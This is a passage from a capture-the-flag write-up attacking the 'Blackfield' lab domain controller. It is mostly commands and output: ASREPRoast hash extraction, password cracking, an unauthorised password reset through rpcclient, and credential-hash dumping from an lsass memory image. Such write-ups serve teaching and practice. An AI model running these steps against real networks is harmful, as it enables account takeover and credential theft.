</span></span><span class=line><span class=cl>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
</span></span><span class=line><span class=cl>5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span><span class=line><span class=cl>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class=line><span class=cl>|_http-title: Not Found
</span></span><span class=line><span class=cl>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class=line><span class=cl>SF-Port53-TCP:V=7.80%I=7%D=9/17%Time=5F63CA20%P=x86_64-unknown-linux-gnu%r
</span></span><span class=line><span class=cl>SF:(DNSVersionBindReqTCP,20,&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07ver
</span></span><span class=line><span class=cl>SF:sion\x04bind\0\0\x10\0\x03&#34;);
</span></span><span class=line><span class=cl>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl>|_clock-skew: 7h06m19s
</span></span><span class=line><span class=cl>| smb2-security-mode:
</span></span><span class=line><span class=cl>|   2.02:
</span></span><span class=line><span class=cl>|_    Message signing enabled and required
</span></span><span class=line><span class=cl>| smb2-time:
</span></span><span class=line><span class=cl>|   date: 2020-09-18T03:50:43
</span></span><span class=line><span class=cl>|_  start_date: N/A
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Read data files from: /usr/bin/../share/nmap
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl># Nmap done at Thu Sep 17 22:45:02 2020 -- 1 IP address (1 host up) scanned in 308.41 seconds
</span></span></code></pre></td></tr></table></div></div><p>It seems we have here a domain controller with hostname DC01.</p><p>Edit <code>/etc/hosts</code> to add the local domain:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>10.10.10.192 backfield.local
</span></span></code></pre></td></tr></table></div></div><h2 id=smb-enumeration>SMB enumeration<a hidden class=anchor aria-hidden=true href=#smb-enumeration>#</a></h2><p>Let&rsquo;s find some some shares:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ smbclient -L //10.10.10.192
</span></span><span class=line><span class=cl>Enter WORKGROUP\cyfun&#39;s password:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        Sharename       Type      Comment
</span></span><span class=line><span class=cl>        ---------       ----      -------
</span></span><span class=line><span class=cl>        ADMIN$          Disk      Remote Admin
</span></span><span class=line><span class=cl>        C$              Disk      Default share
</span></span><span class=line><span class=cl>        forensic        Disk      Forensic / Audit share.
</span></span><span class=line><span class=cl>        IPC$            IPC       Remote IPC
</span></span><span class=line><span class=cl>        NETLOGON        Disk      Logon server share
</span></span><span class=line><span class=cl>        profiles$       Disk
</span></span><span class=line><span class=cl>        SYSVOL          Disk      Logon server share
</span></span><span class=line><span class=cl>SMB1 disabled -- no workgroup available
</span></span></code></pre></td></tr></table></div></div><p>There are two non-default shares:</p><ul><li>forensic</li><li>profiles$</li></ul><p>One is not accessible but the other is:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ smbclient //10.10.10.192/forensic
</span></span><span class=line><span class=cl>Enter WORKGROUP\cyfun&#39;s password:
</span></span><span class=line><span class=cl>Try &#34;help&#34; to get a list of possible commands.
</span></span><span class=line><span class=cl>smb: \&gt; dir
</span></span><span class=line><span class=cl>NT_STATUS_ACCESS_DENIED listing \*
</span></span><span class=line><span class=cl>smb: \&gt; ^C
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ smbclient //10.10.10.192/profiles$
</span></span><span class=line><span class=cl>Enter WORKGROUP\cyfun&#39;s password:
</span></span><span class=line><span class=cl>Try &#34;help&#34; to get a list of possible commands.
</span></span><span class=line><span class=cl>smb: \&gt; dir
</span></span><span class=line><span class=cl>  .                                   D        0  Wed Jun  3 18:47:12 2020
</span></span><span class=line><span class=cl>  ..                                  D        0  Wed Jun  3 18:47:12 2020
</span></span><span class=line><span class=cl>  AAlleni                             D        0  Wed Jun  3 18:47:11 2020
</span></span><span class=line><span class=cl>  ABarteski                           D        0  Wed Jun  3 18:47:11 2020
</span></span><span class=line><span class=cl>  ABekesz                             D        0  Wed Jun  3 18:47:11 2020
</span></span><span class=line><span class=cl>  ABenzies                            D        0  Wed Jun  3 18:47:11 2020
</span></span><span class=line><span class=cl>  ABiemiller                          D        0  Wed Jun  3 18:47:11 2020
</span></span><span class=line><span class=cl>  AChampken                           D        0  Wed Jun  3 18:47:11 2020
</span></span><span class=line><span class=cl>  ACheretei                           D        0  Wed Jun  3 18:47:11 2020
</span></span><span class=line><span class=cl>...
</span></span></code></pre></td></tr></table></div></div><p>Those folders look like people&rsquo;s profile, but there are three folders not
starting with an uppercase letter that doesn&rsquo;t look like a name.</p><ul><li>audit2020</li><li>support</li><li>svc_backup</li></ul><p>We can save all profiles to a file:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ <span class=nb>printf</span> %s <span class=s1>&#39;dir&#39;</span> <span class=p>|</span> smbclient //10.10.10.192/profiles$ <span class=s1>&#39;&#39;</span> <span class=p>|</span> sed <span class=s1>&#39;1,3d;$d&#39;</span> <span class=p>|</span> cut -d <span class=s1>&#39; &#39;</span> -f <span class=m>3</span> -s &gt; profiles.txt
</span></span></code></pre></td></tr></table></div></div><p>As we know from <a href=https://nmap.org/>nmap</a> that the is Kerberos running, let&rsquo;s try ASREPRoast.</p><blockquote><p>The ASREPRoast attack looks for users without Kerberos pre-authentication
required attribute (DONT_REQ_PREAUTH).</p></blockquote><p>Ref. <a href=https://book.hacktricks.xyz/windows/active-directory-methodology/asreproast#asreproast>HackTricks - ASREPRoast</a></p><p>Then Impacket script <code>GetNPUsers</code> allow to check if Kerberos pre-auth
is enabled for those accounts and extract their password hash:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ GetNPUsers.py blackfield.local/ -usersfile profiles.txt -outputfile hash.txt -dc-ip 10.10.10.192 -format john
</span></span><span class=line><span class=cl>[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>[-] User audit2020 doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>[-] User svc_backup doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
</span></span></code></pre></td></tr></table></div></div><p>Only <em>support</em> had is hash extracted.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat hash.txt
</span></span><span class=line><span class=cl>$krb5asrep$support@BLACKFIELD.LOCAL:149b486205f9a8d069335550278e2933$0bfbb61c0a3af8cce3d8cd7f6584f411d9a5ac4053cdd802feadb914de2f9e5efe5f636a4ab76cca735f40754868ec140c6ed0d76ce0fc11891e17f518c5611ad1fb2e0d718f5d48a8c84fb0065e430755c9e6ee533ae52a7294b4b1132d20efc948369602dad416f819d48b0f9845268567c91ee02945d237f188162ebf0f43c7bc279ba887abf229f70319b8204ce4266d1bc98f0ce93bf28f72c1b517ab04f24db30e447085dbc156b8e5a2d8c06885e79c851b928d11975cef973a27f36169183ec240fcaca260996113052274be45c7332b202663a43516a08295f7bc25dabf07f3d86153167190e511be5d16a6cdd1ae94
</span></span></code></pre></td></tr></table></div></div><p>Now we can crack it with <a href=https://www.openwall.com/john/>John the Ripper</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ john hash.txt -w=/usr/share/wordlists/passwords/rockyou.txt --format=krb5asrep-aes-opencl
</span></span><span class=line><span class=cl>$ john hash.txt --show
</span></span><span class=line><span class=cl>$krb5asrep$support@BLACKFIELD.LOCAL:#00^BlackKnight
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>1 password hash cracked, 0 left
</span></span></code></pre></td></tr></table></div></div><h2 id=rpc-enumeration>RPC enumeration<a hidden class=anchor aria-hidden=true href=#rpc-enumeration>#</a></h2><p>We can know make use of the freshly discovered credentials to launch an
authenticated RPC scan to find domain users.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>rpcclient</span> <span class=o>-</span><span class=n>U</span> <span class=n>support</span> <span class=o>-</span><span class=n>W</span> <span class=n>backfield</span><span class=o>.</span><span class=n>local</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.192</span>
</span></span><span class=line><span class=cl><span class=n>Enter</span> <span class=n>BACKFIELD</span><span class=o>.</span><span class=n>LOCAL</span>\<span class=n>support</span><span class=s1>&#39;s password:</span>
</span></span><span class=line><span class=cl><span class=n>rpcclient</span> <span class=o>$&gt;</span> <span class=n>enumdomusers</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>Administrator</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x1f4</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>Guest</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x1f5</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>krbtgt</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x1f6</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>audit2020</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x44f</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>support</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x450</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>BLACKFIELD764430</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x451</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>BLACKFIELD538365</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x452</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>BLACKFIELD438814</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x584</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>svc_backup</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x585</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>lydericlefebvre</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x586</span><span class=p>]</span>
</span></span></code></pre></td></tr></table></div></div><p>We can see <code>lydericlefebvre</code>, a new account we didn&rsquo;t see earlier.</p><p>Now let&rsquo;s list the domain groups:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>rpcclient</span> <span class=o>$&gt;</span> <span class=n>enumdomgroups</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Enterprise</span> <span class=n>Read</span><span class=o>-</span><span class=n>only</span> <span class=n>Domain</span> <span class=n>Controllers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x1f2</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Domain</span> <span class=n>Admins</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x200</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Domain</span> <span class=n>Users</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x201</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Domain</span> <span class=n>Guests</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x202</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Domain</span> <span class=n>Computers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x203</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Domain</span> <span class=n>Controllers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x204</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Schema</span> <span class=n>Admins</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x206</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Enterprise</span> <span class=n>Admins</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x207</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Group</span> <span class=n>Policy</span> <span class=n>Creator</span> <span class=n>Owners</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x208</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Read</span><span class=o>-</span><span class=n>only</span> <span class=n>Domain</span> <span class=n>Controllers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x209</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Cloneable</span> <span class=n>Domain</span> <span class=n>Controllers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x20a</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Protected</span> <span class=n>Users</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x20d</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Key</span> <span class=n>Admins</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x20e</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Enterprise</span> <span class=n>Key</span> <span class=n>Admins</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x20f</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>DnsUpdateProxy</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x44e</span><span class=p>]</span>
</span></span></code></pre></td></tr></table></div></div><p>Those are only default groups. Let&rsquo;s check info about the special accounts we
have.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ rpcclient $&gt; queryuser 0x586
</span></span><span class=line><span class=cl>        User Name   :   lydericlefebvre
</span></span><span class=line><span class=cl>        Full Name   :   Lyd├⌐ric aas. Lefebvre
</span></span><span class=line><span class=cl>        Home Drive  :
</span></span><span class=line><span class=cl>        Dir Drive   :
</span></span><span class=line><span class=cl>        Profile Path:
</span></span><span class=line><span class=cl>        Logon Script:
</span></span><span class=line><span class=cl>        Description :   @lydericlefebvre - VM Creator
</span></span><span class=line><span class=cl>        Workstations:
</span></span><span class=line><span class=cl>        Comment     :
</span></span><span class=line><span class=cl>        Remote Dial :
</span></span><span class=line><span class=cl>        Logon Time               :      Thu, 01 Jan 1970 01:00:00 CET
</span></span><span class=line><span class=cl>        Logoff Time              :      Thu, 01 Jan 1970 01:00:00 CET
</span></span><span class=line><span class=cl>        Kickoff Time             :      Thu, 14 Sep 30828 04:48:05 CEST
</span></span><span class=line><span class=cl>        Password last set Time   :      Fri, 28 Feb 2020 23:33:36 CET
</span></span><span class=line><span class=cl>        Password can change Time :      Sat, 29 Feb 2020 23:33:36 CET
</span></span><span class=line><span class=cl>        Password must change Time:      Thu, 14 Sep 30828 04:48:05 CEST
</span></span><span class=line><span class=cl>        unknown_2[0..31]...
</span></span><span class=line><span class=cl>        user_rid :      0x586
</span></span><span class=line><span class=cl>        group_rid:      0x201
</span></span><span class=line><span class=cl>        acb_info :      0x00000210
</span></span><span class=line><span class=cl>        fields_present: 0x00ffffff
</span></span><span class=line><span class=cl>        logon_divs:     168
</span></span><span class=line><span class=cl>        bad_password_count:     0x00000000
</span></span><span class=line><span class=cl>        logon_count:    0x00000000
</span></span><span class=line><span class=cl>        padding1[0..7]...
</span></span><span class=line><span class=cl>        logon_hrs[0..21]...
</span></span></code></pre></td></tr></table></div></div><p>I don&rsquo;t know if this will be useful later but we now known that <code>lydericlefebvre</code>
could be able to create VM. There was nothing special about the other accounts.</p><h2 id=privilege-escalation-of-machine--from-support-to-audit2020>Privilege Escalation of Machine : from support to audit2020<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-support-to-audit2020>#</a></h2><p>In case our account is privileged we can try to change other account password.
<code>chgpasswd</code> won&rsquo;t help us as it requires the old password. But <code>setuserinfo</code>
doesn&rsquo;t.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>rpcclient $&gt; setuserinfo
</span></span><span class=line><span class=cl>Usage: setuserinfo username level password [password_expired]
</span></span><span class=line><span class=cl>result was NT_STATUS_INVALID_PARAMETER
</span></span></code></pre></td></tr></table></div></div><p>The <strong>level</strong> is defined from <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN">USER_INFORMATION_CLASS</a>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>rpcclient $&gt; setuserinfo audit2020 23 cyfun123!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>rpcclient $&gt; setuserinfo svc_backup 23 cyfun123!
</span></span><span class=line><span class=cl>result: NT_STATUS_ACCESS_DENIED
</span></span><span class=line><span class=cl>result was NT_STATUS_ACCESS_DENIED
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>rpcclient $&gt; setuserinfo lydericlefebvre 23 cyfun123!
</span></span><span class=line><span class=cl>result: NT_STATUS_ACCESS_DENIED
</span></span><span class=line><span class=cl>result was NT_STATUS_ACCESS_DENIED
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation-of-machine--from-audit2020-to-svc_backup>Privilege Escalation of Machine : from audit2020 to svc_backup<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-audit2020-to-svc_backup>#</a></h2><p>With support or unauthenticated we were not able to list the content of the
<em>forensic</em> share but we can with audit2020. So let&rsquo;s dump all we can:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>mkdir</span> <span class=o>-</span><span class=n>p</span> <span class=n>Shares</span><span class=o>/</span><span class=n>forensic</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>cd</span> <span class=n>Shares</span><span class=o>/</span><span class=n>forensic</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>smbclient</span> <span class=o>//</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>10.192</span><span class=o>/</span><span class=n>forensic</span> <span class=o>-</span><span class=n>U</span> <span class=n>audit2020</span> <span class=o>-</span><span class=n>W</span> <span class=n>blackfield</span><span class=o>.</span><span class=n>local</span> <span class=n>cyfun123</span><span class=o>!</span>
</span></span><span class=line><span class=cl><span class=n>Try</span> <span class=s2>&#34;help&#34;</span> <span class=n>to</span> <span class=n>get</span> <span class=n>a</span> <span class=n>list</span> <span class=n>of</span> <span class=n>possible</span> <span class=n>commands</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=n>smb</span><span class=p>:</span> \<span class=o>&gt;</span> <span class=n>ls</span>
</span></span><span class=line><span class=cl>  <span class=o>.</span>                                   <span class=n>D</span>        <span class=mi>0</span>  <span class=n>Sun</span> <span class=n>Feb</span> <span class=mi>23</span> <span class=mi>14</span><span class=p>:</span><span class=mi>03</span><span class=p>:</span><span class=mi>16</span> <span class=mi>2020</span>
</span></span><span class=line><span class=cl>  <span class=o>..</span>                                  <span class=n>D</span>        <span class=mi>0</span>  <span class=n>Sun</span> <span class=n>Feb</span> <span class=mi>23</span> <span class=mi>14</span><span class=p>:</span><span class=mi>03</span><span class=p>:</span><span class=mi>16</span> <span class=mi>2020</span>
</span></span><span class=line><span class=cl>  <span class=n>commands_output</span>                     <span class=n>D</span>        <span class=mi>0</span>  <span class=n>Sun</span> <span class=n>Feb</span> <span class=mi>23</span> <span class=mi>19</span><span class=p>:</span><span class=mi>14</span><span class=p>:</span><span class=mi>37</span> <span class=mi>2020</span>
</span></span><span class=line><span class=cl>  <span class=n>memory_analysis</span>                     <span class=n>D</span>        <span class=mi>0</span>  <span class=n>Thu</span> <span class=n>May</span> <span class=mi>28</span> <span class=mi>22</span><span class=p>:</span><span class=mi>28</span><span class=p>:</span><span class=mi>33</span> <span class=mi>2020</span>
</span></span><span class=line><span class=cl>  <span class=n>tools</span>                               <span class=n>D</span>        <span class=mi>0</span>  <span class=n>Sun</span> <span class=n>Feb</span> <span class=mi>23</span> <span class=mi>14</span><span class=p>:</span><span class=mi>39</span><span class=p>:</span><span class=mi>08</span> <span class=mi>2020</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=mi>7846143</span> <span class=n>blocks</span> <span class=n>of</span> <span class=n>size</span> <span class=mf>4096.</span> <span class=mi>4156574</span> <span class=n>blocks</span> <span class=n>available</span>
</span></span><span class=line><span class=cl><span class=n>smb</span><span class=p>:</span> \<span class=o>&gt;</span> <span class=n>recurse</span> <span class=n>on</span>
</span></span><span class=line><span class=cl><span class=n>smb</span><span class=p>:</span> \<span class=o>&gt;</span> <span class=n>prompt</span> <span class=n>off</span>
</span></span><span class=line><span class=cl><span class=n>smb</span><span class=p>:</span> \<span class=o>&gt;</span> <span class=n>mget</span> <span class=o>*</span>
</span></span></code></pre></td></tr></table></div></div><p>PS: a more clever approach would be to avoid dumping <code>tools/</code> which will take a
lot of time and space for generic binaries we do not need.</p><p>In <code>memory_analissy</code> there is a <code>lsass</code> dump.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cd memory_analysis
</span></span><span class=line><span class=cl>$ unzip lsass.zip
</span></span><span class=line><span class=cl>Archive:  lsass.zip
</span></span><span class=line><span class=cl>  inflating: lsass.DMP
</span></span></code></pre></td></tr></table></div></div><p>Then we can use <strong>pypykatz</strong>, Python implementation of Mimikatz, to try to dump
hashes from here.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ pypykatz lsa minidump lsass.DMP &gt; lsass_dump.txt
</span></span><span class=line><span class=cl>INFO:root:Parsing file lsass.DMP
</span></span></code></pre></td></tr></table></div></div><p>So we obtained those two SHA1 hashes:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>svc_backup:463c13a9a31fc3252c68ba0a44f0221626a33e5c
</span></span><span class=line><span class=cl>Administrator:db5c89a961644f0978b4b69a4d2a2239d7886368
</span></span></code></pre></td></tr></table></div></div><p>And NT hashes:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
